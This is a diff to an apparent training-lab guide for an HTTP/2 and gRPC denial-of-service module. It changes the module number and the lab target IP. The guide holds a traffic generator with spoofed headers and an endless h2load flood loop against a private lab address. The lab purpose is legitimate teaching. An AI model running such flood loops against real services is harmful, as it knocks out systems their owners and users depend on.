@@ -1,4 +1,4 @@
-Module 1 - HTTP/2 and GRPC DoS Attack on Unprotected Application
+Module 6 - HTTP/2 and GRPC DoS Attack on Unprotected Application
 ################################################################
 
 | In this module you will generate **good** and malicious traffic. With the addition of malicious traffic will cause the good traffic to error out. We
@@ -17,7 +17,7 @@ Generate legitimate traffic
    #!/bin/bash
    cd /grpc/examples/python/route_guide/
 
-   IP=10.1.1.4
+   IP=10.1.1.17
    PORT=600
    URI='good_path.html'
 
@@ -26,7 +26,7 @@ Generate legitimate traffic
    while true; do
    echo
    python3 /grpc/examples/python/route_guide/route_guide_client.py  2>&1 | grep "Finished\|502"
-   h2load -n 10 -c 10 --header="te: trailers " --ciphers=AES128-GCM-SHA256  https://10.1.1.4:443/testing/ &> /dev/null
+   h2load -n 10 -c 10 --header="te: trailers " --ciphers=AES128-GCM-SHA256  https://10.1.1.17:443/testing/ &> /dev/null
 
    URI=${array[$(( RANDOM % 3 ))]}
    curl -b cookiefile -c cookiefile -L -s -o /dev/null -w "JUICESHOP HTTP Code:%{http_code}\n" -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -H "X-Forwarded-For: 3.3.3.1" http://${IP}:${PORT}/${URI} &
@@ -60,7 +60,7 @@ Start HTTP/2 Flood attack
    
    #!/bin/sh
    while true; do
-      h2load -n 10000 -c 1000 http://10.1.1.4:500/routeguide.RouteGuide/GetFeature
+      h2load -n 10000 -c 1000 http://10.1.1.17:500/routeguide.RouteGuide/GetFeature
    done
 
 
